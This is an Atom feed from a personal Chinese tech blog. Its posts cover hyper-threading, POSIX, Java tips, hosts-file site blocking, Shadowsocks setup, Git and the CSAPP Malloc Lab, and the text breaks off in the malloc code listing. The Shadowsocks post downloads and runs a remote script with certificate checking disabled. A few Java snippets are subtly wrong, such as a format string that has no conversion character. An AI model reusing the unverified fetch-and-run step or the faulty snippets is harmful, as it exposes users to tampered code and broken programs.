<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Wiki</title>
  
  
  <link href="/wiki/atom.xml" rel="self"/>
  
  <link href="http://larryim.cc/"/>
  <updated>2018-07-12T14:44:11.444Z</updated>
  <id>http://larryim.cc/</id>
  
  <author>
    <name>larry</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>超线程</title>
    <link href="http://larryim.cc/2018/07/12/OS-%E8%B6%85%E7%BA%BF%E7%A8%8B/"/>
    <id>http://larryim.cc/2018/07/12/OS-超线程/</id>
    <published>2018-07-11T16:00:00.000Z</published>
    <updated>2018-07-12T14:44:11.444Z</updated>
    
    <content type="html"><![CDATA[<p>Intel的超线程技术(Hyper-Threading Technology, HTT)最早出现在2002年2月发布的Xeon处理器上，并于同年底应用在Pentium 4处理器中[1]。超线程技术使一个单一核处理器看起来像多核处理器。对于每一个逻辑核都有架构状态(architecture state，see <a href="https://en.wikipedia.org/wiki/Architectural_state">wiki</a>)的拷贝，并且逻辑核能够共享物理处理资源[2]。</p><p>架构状态(architecture state)由寄存器组成，包括general-purpose registers, the control registers, the advanced programmable interrupt controller (APIC) registers, 和一些machine state registers[2~~~~].</p><p><img src="http://or9a8nskt.bkt.clouddn.com/Processors with Hypter-Threading Technology.png" alt="Processors with Hypter-Threading Technology"></p><p>使用超线程技术能够提高处理器性能：</p><p><img src="http://or9a8nskt.bkt.clouddn.com/performace.png" alt="performace"></p><ol><li><a href="https://en.wikipedia.org/wiki/Hyper-threading">Hyper-threading</a></li><li><a href="http://www.cs.sfu.ca/~fedorova/Teaching/CMPT886/Spring2007/papers/hyper-threading.pdf">Hyper-Threading Technology Architecture and Microarchitecture</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Intel的超线程技术(Hyper-Threading Technology, HTT)最早出现在2002年2月发布的Xeon处理器上，并于同年底应用在Pentium 4处理器中[1]。超线程技术使一个单一核处理器看起来像多核处理器。对于每一个逻辑核都有架构状态(archi
      
    
    </summary>
    
      <category term="OS" scheme="http://larryim.cc/categories/OS/"/>
    
    
      <category term="OS" scheme="http://larryim.cc/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>POSIX</title>
    <link href="http://larryim.cc/2018/07/12/OS-POSIX/"/>
    <id>http://larryim.cc/2018/07/12/OS-POSIX/</id>
    <published>2018-07-11T16:00:00.000Z</published>
    <updated>2018-07-12T01:49:00.181Z</updated>
    
    <content type="html"><![CDATA[<p>可移植操作系统接口(POSIX, Portable Operating System Interface)，是基于现有的UNIX 实践和经验，描述了操作系统的调用服务接口，用于保证编制的应用程序可以在源代码一级上在多种操作系统上移植运行[1]。 当前的POSIX主要分为四个部分: Base Definitions、System Interfaces、Shell and Utilities和Rationale.</p><p>[1]  Kardinal. <a href="http://i.linuxtoy.org/docs/guide/ch48s05.html">开源世界旅行手册</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;可移植操作系统接口(POSIX, Portable Operating System Interface)，是基于现有的UNIX 实践和经验，描述了操作系统的调用服务接口，用于保证编制的应用程序可以在源代码一级上在多种操作系统上移植运行[1]。 当前的POSIX主要分为四个
      
    
    </summary>
    
      <category term="OS" scheme="http://larryim.cc/categories/OS/"/>
    
    
      <category term="OS" scheme="http://larryim.cc/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>修饰词native</title>
    <link href="http://larryim.cc/2018/07/12/Java-%E5%85%B3%E9%94%AE%E5%AD%97native/"/>
    <id>http://larryim.cc/2018/07/12/Java-关键字native/</id>
    <published>2018-07-11T16:00:00.000Z</published>
    <updated>2018-09-23T13:42:01.340Z</updated>
    
    <content type="html"><![CDATA[<p>在<code>Class Object</code>中一个<code>wait()</code>方法定义为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">(<span class="keyword">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br></pre></td></tr></table></figure><p>这里的native修饰词说明其修饰的方法的实现，是用其他语言(C/C++)实现的，该方法通过JNI调用本地代码。</p><h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><p><strong>JNI</strong>(Java Native Interface, Java本地接口)使Java虚拟机中的Java程序可以调用本地代码。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15345839777611.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在&lt;code&gt;Class Object&lt;/code&gt;中一个&lt;code&gt;wait()&lt;/code&gt;方法定义为：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=
      
    
    </summary>
    
      <category term="Java" scheme="http://larryim.cc/categories/Java/"/>
    
    
      <category term="Java" scheme="http://larryim.cc/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java record</title>
    <link href="http://larryim.cc/2018/07/12/Java-record/"/>
    <id>http://larryim.cc/2018/07/12/Java-record/</id>
    <published>2018-07-11T16:00:00.000Z</published>
    <updated>2018-11-24T03:15:44.988Z</updated>
    
    <content type="html"><![CDATA[<p>记录在开发过程中遇到的java常见小问题、细节问题。</p><h4 id="获得二维数组长度"><a href="#获得二维数组长度" class="headerlink" title="获得二维数组长度"></a>获得二维数组长度</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>[][] board</span><br><span class="line"><span class="keyword">int</span> n = board.length;</span><br><span class="line"><span class="keyword">int</span> m = n &gt; <span class="number">0</span> ? board[<span class="number">0</span>].length : <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h4 id="初始化二维数组"><a href="#初始化二维数组" class="headerlink" title="初始化二维数组"></a>初始化二维数组</h4><p><a href="https://stackoverflow.com/questions/13832880/initialize-2d-array">https://stackoverflow.com/questions/13832880/initialize-2d-array</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">char</span>[][] table = &#123;&#123;<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>&#125;, &#123;<span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>&#125;, &#123;<span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h4 id="排序二维数组"><a href="#排序二维数组" class="headerlink" title="排序二维数组"></a>排序二维数组</h4><p>按照第1个元素排序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Arrays.sort(myArr, (a, b) -&gt; Double.compare(a[<span class="number">0</span>], b[<span class="number">0</span>]));</span><br><span class="line">Arrays.sort(queries, Comparator.comparing(a -&gt; a[<span class="number">0</span>]));</span><br><span class="line">Arrays.sort(queries, (a, b) -&gt; a[<span class="number">0</span>] - b[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h4 id="打印数组"><a href="#打印数组" class="headerlink" title="打印数组"></a>打印数组</h4><p><a href="https://stackoverflow.com/questions/409784/whats-the-simplest-way-to-print-a-java-array">https://stackoverflow.com/questions/409784/whats-the-simplest-way-to-print-a-java-array</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Arrays.toString(array));</span><br><span class="line">Nested Array:</span><br><span class="line">System.out.println(Arrays.deepToString(deepArray));</span><br></pre></td></tr></table></figure><h4 id="java中int转成String位数不足前面补零"><a href="#java中int转成String位数不足前面补零" class="headerlink" title="java中int转成String位数不足前面补零"></a>java中int转成String位数不足前面补零</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.format(<span class="string">"%06"</span>,<span class="number">12</span>);<span class="comment">//其中0表示补零而不是补空格，6表示至少6位</span></span><br></pre></td></tr></table></figure><h4 id="Java最小值和最大值"><a href="#Java最小值和最大值" class="headerlink" title="Java最小值和最大值"></a>Java最小值和最大值</h4><p><code>Integer.MIN_VALUE</code>和<code>Integer.MAX_VALUE</code></p><h4 id="将List转化为数组"><a href="#将List转化为数组" class="headerlink" title="将List转化为数组"></a>将List转化为数组</h4><p>使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">String[] a = list.toArray(<span class="keyword">new</span> String[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>而不是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">...</span><br><span class="line">String[] a = (String[]) list.toArray(list);</span><br></pre></td></tr></table></figure><p>但是一下做法是错误的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">int</span>[] a = list.toArray(<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>原因就在与<code>int</code>不能作为范型类型参数(use int as a type argument for generics)。所以只能利用Java8的新特性了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] array = list.stream().mapToInt(i-&gt;i).toArray();</span><br></pre></td></tr></table></figure><h4 id="将数组转化为List"><a href="#将数组转化为List" class="headerlink" title="将数组转化为List"></a>将数组转化为List</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Arrays.asList(spam);</span><br></pre></td></tr></table></figure><p><a href="https://stackoverflow.com/questions/1073919/how-to-convert-int-into-listinteger-in-java">https://stackoverflow.com/questions/1073919/how-to-convert-int-into-listinteger-in-java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; list = Arrays.stream(ints).boxed().collect(Collectors.toList());</span><br></pre></td></tr></table></figure><h4 id="Java数组拷贝"><a href="#Java数组拷贝" class="headerlink" title="Java数组拷贝"></a>Java数组拷贝</h4><h5 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h5><p>clone方法是从Object类继承过来的，基本数据类型（String ，boolean，char，byte，short，float ，double，long）都可以直接使用clone方法进行克隆，注意String类型是因为其值不可变所以才可以使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a1 = &#123;<span class="number">1</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] a2 = a1.clone();</span><br></pre></td></tr></table></figure><h5 id="System-arraycopy"><a href="#System-arraycopy" class="headerlink" title="System.arraycopy"></a>System.arraycopy</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">arraycopy</span><span class="params">(Object src, <span class="keyword">int</span> srcPos, </span></span></span><br><span class="line"><span class="function"><span class="params">        Object dest, <span class="keyword">int</span> desPos, <span class="keyword">int</span> length)</span></span></span><br></pre></td></tr></table></figure><p>由于是native方法，所以效率非常高，在频繁拷贝数组的时候，建议使用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录在开发过程中遇到的java常见小问题、细节问题。&lt;/p&gt;
&lt;h4 id=&quot;获得二维数组长度&quot;&gt;&lt;a href=&quot;#获得二维数组长度&quot; class=&quot;headerlink&quot; title=&quot;获得二维数组长度&quot;&gt;&lt;/a&gt;获得二维数组长度&lt;/h4&gt;&lt;figure class=&quot;
      
    
    </summary>
    
      <category term="Java" scheme="http://larryim.cc/categories/Java/"/>
    
    
      <category term="Java" scheme="http://larryim.cc/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://larryim.cc/2018/03/01/C-%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://larryim.cc/2018/03/01/C-面试题/</id>
    <published>2018-03-01T14:52:38.441Z</published>
    <updated>2018-03-01T14:53:09.211Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="C++" scheme="http://larryim.cc/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>Mac禁止访问网站</title>
    <link href="http://larryim.cc/2018/02/02/%E5%B0%8F%E6%8A%80%E5%B7%A7-Mac%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99/"/>
    <id>http://larryim.cc/2018/02/02/小技巧-Mac禁止访问网站/</id>
    <published>2018-02-01T16:00:00.000Z</published>
    <updated>2018-03-14T04:47:33.968Z</updated>
    
    <content type="html"><![CDATA[<p>最近总是在用电脑的时候，访问一些信息网站，浪费了大量宝贵的时间。在MAC上，禁止访问某些网站，可以直接通过修改host进行。打开终端，在终端输入</p><p><code>sudo vim /etc/hosts</code></p><p>然后输入密码，然后添加”127.0.0.1”+网址（星号代表子域名）。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 www.zhihu.com</span><br><span class="line">127.0.0.1 *.360.cn</span><br><span class="line">127.0.0.1 指定的网址</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近总是在用电脑的时候，访问一些信息网站，浪费了大量宝贵的时间。在MAC上，禁止访问某些网站，可以直接通过修改host进行。打开终端，在终端输入&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo vim /etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后输入密码，然后添加”127.0
      
    
    </summary>
    
      <category term="小技巧" scheme="http://larryim.cc/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="website" scheme="http://larryim.cc/tags/website/"/>
    
      <category term="mac" scheme="http://larryim.cc/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://larryim.cc/2018/01/06/index/"/>
    <id>http://larryim.cc/2018/01/06/index/</id>
    <published>2018-01-05T21:24:09.988Z</published>
    <updated>2018-03-11T05:37:46.012Z</updated>
    
    <content type="html"><![CDATA[<p>分享、记录CS</p><p>内容包括：</p><ul><li>Leetcode</li><li>CSAPP</li><li>TensorFlow</li><li>常用软件配置安装</li></ul><p>Name: 王振华<br>BLOG: <a href="http://larryim.cc">http://larryim.cc</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;分享、记录CS&lt;/p&gt;
&lt;p&gt;内容包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Leetcode&lt;/li&gt;
&lt;li&gt;CSAPP&lt;/li&gt;
&lt;li&gt;TensorFlow&lt;/li&gt;
&lt;li&gt;常用软件配置安装&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Name: 王振华&lt;br&gt;BLOG: &lt;a href=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建shadowsocks</title>
    <link href="http://larryim.cc/2018/01/01/awesome-Install-shadowsocks/"/>
    <id>http://larryim.cc/2018/01/01/awesome-Install-shadowsocks/</id>
    <published>2017-12-31T16:00:00.000Z</published>
    <updated>2018-01-28T07:32:15.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shadowsocks简介"><a href="#Shadowsocks简介" class="headerlink" title="Shadowsocks简介"></a>Shadowsocks简介</h2><p><code>Shadowsocks</code>(ss) 是由 <a href="https://github.com/Clowwindy">Clowwindy</a> 开发的一款软件，其作用本来是加密传输资料。当然，也正因为它加密传输资料的特性，使得GFW没法将由它传输的资料和其他普通资料区分开来（上图），也就不能干扰我们访问那些「不存在」的网站了。</p><h4 id="VPS简介"><a href="#VPS简介" class="headerlink" title="VPS简介"></a>VPS简介</h4><p>VPS(Virtual private server) 译作虚拟专用伺服器。你可以把它简单地理解为一台在远端的强劲电脑。当你租用了它以后，可以给它安装操作系统、软件，并通过一些工具连接和远程操控它。</p><p><a href="https://bandwagonhost.com/">「搬瓦工」</a>是一家 VPS 服务器提供商，有美国、亚洲、欧洲等多地的 VPS。它家的服务器以性价比高、访问速度快闻名。</p><h4 id="Linux-和-SSH简介"><a href="#Linux-和-SSH简介" class="headerlink" title="Linux 和 SSH简介"></a>Linux 和 SSH简介</h4><p>Linux是免费开源的操作系统，大概被世界上过半服务器所采用。有大量优秀的开源软件可以安装，上述 <code>Shadowsocks</code> 就是其一。你可以通过命令行来直接给Linux 操作系统「下命令」，比如 <code>$ cd ~/Desktop</code> 就是进入你根目录下的 Desktop 文件夹。</p><p>而 SSH 是一种网络协议，作为每一台 Linux 电脑的标准配置，用于计算机之间的加密登录。当你为租用的 VPS 安装 Linux 系统后，只要借助一些工具，就可以用 SSH 在你自己的 Mac/PC 电脑上远程登录该 VPS 了。</p><h2 id="部署-Shadowsocks"><a href="#部署-Shadowsocks" class="headerlink" title="部署 Shadowsocks"></a>部署 Shadowsocks</h2><p><code>Shadowsocks</code> 需要同时具备客户端和服务器端，所以它的部署也需要分两步。</p><h3 id="部署-Shadowsocks-服务器端"><a href="#部署-Shadowsocks-服务器端" class="headerlink" title="部署 Shadowsocks 服务器端"></a>部署 Shadowsocks 服务器端</h3><p>这里使用<a href="https://teddysun.com/342.html">teddysun</a> 的一键安装脚本。</p><p>以下是3条命令，每次输入一行、回车，等待屏幕上的操作完成后再输入下一条。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate [https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh](https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh)</span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure><p>最后一步输完，你应该会看到下图中内容──是要你为<code>Shadowsocks</code> 服务设置一个个人密码。</p><p>输好回车后会让你选择一个端口，输入1–65535间的数字都行。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/ss.png" alt="ss"></p><p>遵照上图指示，按任意键开始部署<code>Shadowsocks</code>。这时你什么都不用做，只需要静静地等它运行完就好。结束后就会看到你所部署的<code>Shadowsocks</code>的配置信息。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/ss_complete.png" alt="ss_complete"></p><p>记住其中黄框中的内容，也就是服务器 IP、服务器端口、你设的密码和加密方式。</p><h4 id="3-2-TCP-Fast-Open"><a href="#3-2-TCP-Fast-Open" class="headerlink" title="3.2 TCP Fast Open"></a>3.2 TCP Fast Open</h4><p>实际上只要具备上述四个信息，你就可以在自己的任意设备上进行登录使用了。但是为了更好的连接速度，你还需要多做几步。</p><p>首先是打开 TCP Fast Open，输入以下命令，意为用 nano 这个编辑器打开一个文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/rc.local</span><br></pre></td></tr></table></figure><p>你的「终端」会刷新一下，出现下图。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/nano.png" alt="nano"></p><p>别慌张，它就是个文本编辑器。用方向键把光标移到最末端，粘贴下面这一行内容，然后按 <code>Ctrl + X</code>退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 3 &gt; /proc/sys/net/ipv4/tcp_fastopen</span><br></pre></td></tr></table></figure><p>输入“Y”并回车确认退出。</p><p>然后依法炮制，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>在文末加上下面的内容，保存退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.tcp_fastopen = 3</span><br></pre></td></tr></table></figure><p>再打开一个<code>Shadowsocks</code> 配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/shadowsocks.json</span><br></pre></td></tr></table></figure><p>把其中 “fast_open” 一项的 <code>false</code> 替换成 <code>true</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;fast_open&quot;:true</span><br></pre></td></tr></table></figure><p>如果你希望添加多用户的话，可以将 “password” 字段如下图修改。其中，”22345”:”password1”意为该用户使用 22345 端口、以“password1”为密码连接登录<code>Shadowsocks</code>。</p><p>保存退出。最后，输入以下命令重启 <code>Shadowsocks</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/shadowsocks restart</span><br></pre></td></tr></table></figure><h4 id="3-3安装Shadowsocks客户端"><a href="#3-3安装Shadowsocks客户端" class="headerlink" title="3.3安装Shadowsocks客户端"></a>3.3安装<code>Shadowsocks</code>客户端</h4><p>相比服务器端的安装，客户端的安装就简单了许多。首先，根据操作系统下载相应的客户端。</p><ul><li><a href="https://sourceforge.net/projects/shadowsocksgui">Mac 版客户端下载</a></li><li><a href="https://github.com/shadowsocks/shadowsocks-windows/releases">Win 版客户端下载</a></li></ul><p>打开客户端，在「服务器设定」(Servers-Open Server Preferences)里新增服务器。然后依次填入服务器 IP、服务器端口、你设的密码和加密方式。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/ss_mac.png" alt="ss_mac"><br><img src="http://or9a8nskt.bkt.clouddn.com/ss_prefenence1.png" alt="ss_prefenence1"></p><p>然后启用代理，就可以实现科学上网了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Shadowsocks简介&quot;&gt;&lt;a href=&quot;#Shadowsocks简介&quot; class=&quot;headerlink&quot; title=&quot;Shadowsocks简介&quot;&gt;&lt;/a&gt;Shadowsocks简介&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Shadowsocks&lt;/code&gt;(s
      
    
    </summary>
    
      <category term="awesome Install" scheme="http://larryim.cc/categories/awesome-Install/"/>
    
    
      <category term="ss" scheme="http://larryim.cc/tags/ss/"/>
    
  </entry>
  
  <entry>
    <title>Git</title>
    <link href="http://larryim.cc/2018/01/01/TOOLS-Git/"/>
    <id>http://larryim.cc/2018/01/01/TOOLS-Git/</id>
    <published>2017-12-31T16:00:00.000Z</published>
    <updated>2018-09-17T10:06:51.671Z</updated>
    
    <content type="html"><![CDATA[<p>在<code>git pull</code>时出现的问题<code>fatal: refusing to merge unrelated histories</code>。</p><p>处理方案，添加<code>--allow-unrelated-histories</code>.</p><h2 id="repositories-合并"><a href="#repositories-合并" class="headerlink" title="repositories 合并"></a>repositories 合并</h2><p>You can merge repository A into a subdirectory of a project B using the subtree merge strategy. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote add -f Bproject /path/to/B</span><br><span class="line">git merge -s ours --allow-unrelated-histories --no-commit Bproject/master</span><br><span class="line">git <span class="built_in">read</span>-tree --prefix=dir-B/ -u Bproject/master</span><br><span class="line">git commit -m <span class="string">"Merge B project as our subdirectory"</span></span><br><span class="line">git pull -s subtree Bproject master</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在&lt;code&gt;git pull&lt;/code&gt;时出现的问题&lt;code&gt;fatal: refusing to merge unrelated histories&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;处理方案，添加&lt;code&gt;--allow-unrelated-histories&lt;/c
      
    
    </summary>
    
      <category term="TOOLS" scheme="http://larryim.cc/categories/TOOLS/"/>
    
    
      <category term="Git" scheme="http://larryim.cc/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Lab6 Malloc Lab</title>
    <link href="http://larryim.cc/2017/12/30/CSAPP-Lab-Malloc-lab/"/>
    <id>http://larryim.cc/2017/12/30/CSAPP-Lab-Malloc-lab/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-07-09T04:21:24.061Z</updated>
    
    <content type="html"><![CDATA[<p>Malloc Lab的目的是设计一个通用分配器。它基于隐式空闲链表，使用立即边界标记合并方式。</p><p>分配器包含在一个源文件<code>mm.c</code>中，这次Lab需要完成四个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">/* 初始化分配器 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;  <span class="comment">/* malloc */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span>; <span class="comment">/* free */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span>; <span class="comment">/* realloc */</span></span><br></pre></td></tr></table></figure><p>堆的示意图如下所示。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/heap_model.png" alt="heap_model"></p><p>最后发现这个lab的答案书上竟然已经写出来了，写的特别好，借鉴一下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span 